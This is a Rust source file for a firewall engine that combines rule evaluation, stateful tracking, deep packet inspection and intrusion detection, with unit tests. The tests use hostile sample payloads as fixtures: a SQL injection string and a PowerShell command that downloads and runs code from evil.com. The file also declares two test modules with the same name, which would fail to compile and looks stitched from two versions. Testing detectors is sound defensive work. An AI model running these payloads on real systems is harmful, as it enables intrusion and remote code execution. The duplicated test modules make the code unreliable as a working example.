// firewallx/src/modules/engine.rs
// Core FirewallEngine: stateful inspection + rule evaluation + DPI + IDS/IPS.

use crate::modules::dpi::DpiEngine;
use crate::modules::ids::{IdsEngine, IdsConfig};
use crate::modules::logger::FirewallLogger;
use crate::modules::packet::Packet;
use crate::modules::rule::{Action, RuleSet};
use crate::modules::state::StateTable;

/// The verdict returned for every packet.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Decision {
    Allow,
    Drop,
    Reject,
    /// Dropped by DPI (payload threat detected).
    DpiBlock,
    /// Dropped by IDS/IPS (behavioural / rate-based threat).
    IpsBlock,
}

/// Running counters for processed packets.
#[derive(Debug, Default, Clone)]
pub struct Stats {
    pub total: u64,
    pub allowed: u64,
    pub dropped: u64,
    pub rejected: u64,
    pub dpi_blocked: u64,
    pub ips_blocked: u64,
}

/// Engine feature flags — toggle subsystems at runtime.
#[derive(Debug, Clone)]
pub struct EngineConfig {
    pub dpi_enabled: bool,
    pub ids_enabled: bool,
}

impl Default for EngineConfig {
    fn default() -> Self {
        Self { dpi_enabled: true, ids_enabled: true }
    }
}

/// The main firewall engine.
pub struct FirewallEngine {
    ruleset: RuleSet,
    state_table: StateTable,
    logger: FirewallLogger,
    dpi: DpiEngine,
    ids: IdsEngine,
    config: EngineConfig,
    stats: Stats,
}

impl FirewallEngine {
    /// Construct a new engine with the provided rule set and default config.
    pub fn new(ruleset: RuleSet) -> Self {
        Self {
            ruleset,
            state_table: StateTable::new(65_536),
            logger: FirewallLogger::new(),
            dpi: DpiEngine::new(),
            ids: IdsEngine::new(IdsConfig::default()),
            config: EngineConfig::default(),
            stats: Stats::default(),
        }
    }

    /// Construct with explicit feature flags and custom IDS config.
    pub fn with_config(ruleset: RuleSet, config: EngineConfig, ids_config: IdsConfig) -> Self {
        Self {
            ruleset,
            state_table: StateTable::new(65_536),
            logger: FirewallLogger::new(),
            dpi: DpiEngine::new(),
            ids: IdsEngine::new(ids_config),
            config,
            stats: Stats::default(),
        }
    }

    /// Process a single packet (header-only; no payload bytes) and return a verdict.
    ///
    /// Full pipeline:
    ///   1. IDS/IPS — rate-based and behavioural checks on the header.
    ///   2. State table — fast-path for established sessions.
    ///   3. Rule set — priority-ordered policy evaluation.
    ///   4. Default deny if no rule matched.
    ///   5. Insert into state table on Allow.
    ///   6. Log + update stats.
    pub fn process(&mut self, pkt: &Packet) -> Decision {
        self.stats.total += 1;

        // ── Step 1: IDS/IPS (header-level) ───────────────────
        if self.config.ids_enabled {
            let alerts = self.ids.inspect(pkt);
            if alerts.iter().any(|a| a.block) {
                self.stats.ips_blocked += 1;
                return Decision::IpsBlock;
            }
        }

        // ── Step 2: stateful fast-path ────────────────────────
        if self.state_table.lookup(pkt) {
            self.stats.allowed += 1;
            self.logger.log_allow(pkt, "stateful");
            return Decision::Allow;
        }

        // ── Step 3: rule evaluation ───────────────────────────
        let decision = match self.ruleset.evaluate(pkt) {
            Some(rule) => {
                self.logger.log_rule_hit(pkt, rule);
                match rule.action {
                    Action::Allow  => Decision::Allow,
                    Action::Drop   => Decision::Drop,
                    Action::Reject => {
                        self.ids.record_reject(pkt.src_ip);
                        Decision::Reject
                    }
                }
            }
            // ── Step 4: default deny ──────────────────────────
            None => {
                self.logger.log_default_deny(pkt);
                Decision::Drop
            }
        };

        // ── Step 5: state table insert on Allow ───────────────
        if decision == Decision::Allow {
            self.state_table.insert(pkt);
        }

        // ── Step 6: stats ─────────────────────────────────────
        match &decision {
            Decision::Allow  => self.stats.allowed  += 1,
            Decision::Drop   => self.stats.dropped  += 1,
            Decision::Reject => self.stats.rejected += 1,
            _                => {}
        }

        decision
    }

    /// Process a packet with a payload for DPI inspection.
    /// Runs the full pipeline then additionally inspects the payload bytes.
    /// Returns `Decision::DpiBlock` if the DPI engine finds a threat.
    pub fn process_with_payload(&mut self, pkt: &Packet, payload: &[u8]) -> Decision {
        // Header-level decision first
        let header_decision = self.process(pkt);
        if header_decision != Decision::Allow {
            return header_decision;
        }

        // DPI on the payload
        if self.config.dpi_enabled {
            let dpi_result = self.dpi.inspect(payload);
            if dpi_result.blocked {
                self.stats.dpi_blocked += 1;
                // Undo the Allow stat added in process()
                self.stats.allowed  = self.stats.allowed.saturating_sub(1);
                return Decision::DpiBlock;
            }
        }

        Decision::Allow
    }

    // ── Accessors ─────────────────────────────────────────────

    pub fn stats(&self) -> Stats { self.stats.clone() }

    pub fn ruleset_mut(&mut self) -> &mut RuleSet { &mut self.ruleset }

    pub fn state_table_mut(&mut self) -> &mut StateTable { &mut self.state_table }

    pub fn dpi_mut(&mut self) -> &mut DpiEngine { &mut self.dpi }

    pub fn ids_mut(&mut self) -> &mut IdsEngine { &mut self.ids }

    pub fn config_mut(&mut self) -> &mut EngineConfig { &mut self.config }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::net::Ipv4Addr;
    use crate::modules::packet::{Packet, Protocol, Direction};
    use crate::modules::rule::{Rule, Action, RuleSet};

    fn build_engine() -> FirewallEngine {
        let mut rs = RuleSet::new();
        rs.add(Rule::new(
            1, "Allow SSH", Action::Allow,
            None, None, Some(22),
            Protocol::Tcp, Direction::Inbound,
        ));
        rs.add(Rule::new(
            2, "Block Telnet", Action::Drop,
            None, None, Some(23),
            Protocol::Tcp, Direction::Inbound,
        ));
        FirewallEngine::new(rs)
    }

    fn pkt(dst_port: u16, dir: Direction) -> Packet {
        Packet::new(
            Ipv4Addr::new(1, 2, 3, 4),
            Ipv4Addr::new(10, 0, 0, 1),
            54000, dst_port,
            Protocol::Tcp, dir, 64,
        )
    }

    #[test]
    fn test_allow_ssh() {
        let mut engine = build_engine();
        assert_eq!(engine.process(&pkt(22, Direction::Inbound)), Decision::Allow);
    }

    #[test]
    fn test_drop_telnet() {
        let mut engine = build_engine();
        assert_eq!(engine.process(&pkt(23, Direction::Inbound)), Decision::Drop);
    }

    #[test]
    fn test_default_deny_unknown_port() {
        let mut engine = build_engine();
        assert_eq!(engine.process(&pkt(9999, Direction::Inbound)), Decision::Drop);
    }

    #[test]
    fn test_stateful_second_packet_allowed() {
        let mut engine = build_engine();
        let p = pkt(22, Direction::Inbound);
        assert_eq!(engine.process(&p), Decision::Allow);
        // Same packet again — should take the stateful fast-path
        assert_eq!(engine.process(&p), Decision::Allow);
        assert_eq!(engine.stats().allowed, 2);
    }

    #[test]
    fn test_stats_tracking() {
        let mut engine = build_engine();
        engine.process(&pkt(22, Direction::Inbound)); // allowed
        engine.process(&pkt(23, Direction::Inbound)); // dropped
        engine.process(&pkt(9999, Direction::Inbound)); // dropped (default)
        let s = engine.stats();
        assert_eq!(s.total,   3);
        assert_eq!(s.allowed, 1);
        assert_eq!(s.dropped, 2);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::net::Ipv4Addr;
    use crate::modules::packet::{Packet, Protocol, Direction};
    use crate::modules::rule::{Rule, Action, RuleSet};
    use crate::modules::ids::IdsConfig;
    use std::time::Duration;

    fn build_engine() -> FirewallEngine {
        let mut rs = RuleSet::new();
        rs.add(Rule::new(1, "Allow SSH",    Action::Allow, None, None, Some(22), Protocol::Tcp, Direction::Inbound));
        rs.add(Rule::new(2, "Block Telnet", Action::Drop,  None, None, Some(23), Protocol::Tcp, Direction::Inbound));
        FirewallEngine::new(rs)
    }

    fn pkt(dst_port: u16, dir: Direction) -> Packet {
        Packet::new(Ipv4Addr::new(1,2,3,4), Ipv4Addr::new(10,0,0,1), 54000, dst_port, Protocol::Tcp, dir, 64)
    }

    #[test]
    fn test_allow_ssh()              { assert_eq!(build_engine().process(&pkt(22, Direction::Inbound)),  Decision::Allow); }
    #[test]
    fn test_drop_telnet()            { assert_eq!(build_engine().process(&pkt(23, Direction::Inbound)),  Decision::Drop); }
    #[test]
    fn test_default_deny()           { assert_eq!(build_engine().process(&pkt(9999, Direction::Inbound)), Decision::Drop); }

    #[test]
    fn test_stateful_second_packet() {
        let mut e = build_engine();
        let p = pkt(22, Direction::Inbound);
        assert_eq!(e.process(&p), Decision::Allow);
        assert_eq!(e.process(&p), Decision::Allow);
        assert_eq!(e.stats().allowed, 2);
    }

    #[test]
    fn test_dpi_blocks_malicious_payload() {
        let mut e = build_engine();
        let p = pkt(22, Direction::Inbound);
        // SQL injection payload
        let payload = b"GET /login?id=' OR '1'='1 HTTP/1.1";
        // First allow via header (port 22), then DPI blocks it
        let verdict = e.process_with_payload(&p, payload);
        assert_eq!(verdict, Decision::DpiBlock);
        assert_eq!(e.stats().dpi_blocked, 1);
    }

    #[test]
    fn test_dpi_clean_payload_allowed() {
        let mut e = build_engine();
        let p = pkt(22, Direction::Inbound);
        let clean_payload = b"SSH-2.0-OpenSSH_8.9p1";
        let verdict = e.process_with_payload(&p, clean_payload);
        assert_eq!(verdict, Decision::Allow);
    }

    #[test]
    fn test_ids_port_scan_triggers_ips_block() {
        let mut cfg = IdsConfig::default();
        cfg.ips_mode = true;
        cfg.port_scan_threshold = 5;
        cfg.window = Duration::from_secs(60);

        let mut rs = RuleSet::new();
        rs.add(Rule::new(1, "Allow all inbound", Action::Allow, None, None, None, Protocol::Tcp, Direction::Inbound));
        let mut engine = FirewallEngine::with_config(rs, EngineConfig::default(), cfg);

        let attacker = Ipv4Addr::new(9, 9, 9, 9);
        // Probe 6 different ports to trigger the scan detector
        for port in 100..106u16 {
            let p = Packet::new(attacker, Ipv4Addr::new(10,0,0,1), 1000, port, Protocol::Tcp, Direction::Inbound, 0);
            engine.process(&p);
        }
        // Next packet should be IPS-blocked
        let p = Packet::new(attacker, Ipv4Addr::new(10,0,0,1), 1000, 443, Protocol::Tcp, Direction::Inbound, 0);
        assert_eq!(engine.process(&p), Decision::IpsBlock);
    }

    #[test]
    fn test_dpi_can_be_disabled() {
        let cfg = EngineConfig { dpi_enabled: false, ids_enabled: true };
        let mut rs = RuleSet::new();
        rs.add(Rule::new(1, "Allow all", Action::Allow, None, None, None, Protocol::Tcp, Direction::Inbound));
        let mut engine = FirewallEngine::with_config(rs, cfg, IdsConfig::default());
        let p = pkt(80, Direction::Inbound);
        let malicious = b"IEX(New-Object Net.WebClient).DownloadString('http://evil.com')";
        // DPI is off → should be allowed despite malicious payload
        assert_eq!(engine.process_with_payload(&p, malicious), Decision::Allow);
    }

    #[test]
    fn test_stats_all_categories() {
        let mut e = build_engine();
        e.process(&pkt(22,   Direction::Inbound)); // allow
        e.process(&pkt(23,   Direction::Inbound)); // drop
        e.process(&pkt(9999, Direction::Inbound)); // drop (default deny)
        let s = e.stats();
        assert_eq!(s.total,   3);
        assert_eq!(s.allowed, 1);
        assert_eq!(s.dropped, 2);
    }
}
